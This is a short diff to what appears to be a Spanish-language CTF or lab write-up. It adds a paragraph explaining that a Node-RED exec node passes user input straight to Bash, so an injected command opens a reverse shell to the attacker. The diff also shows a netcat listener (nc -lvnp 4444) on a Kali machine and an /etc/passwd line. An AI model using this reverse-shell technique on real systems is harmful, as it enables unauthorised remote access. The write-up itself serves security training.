@@ -349,6 +349,8 @@ dfinkelstein:x:1002:1002:,,,:/home/dfinkelstein:/bin/bash
 
 
 ## Escalada de privilegios
+Gracias a NODE-RED, el comando que se puede ver en la impagen, funciona cuando se inyecta porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
+
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
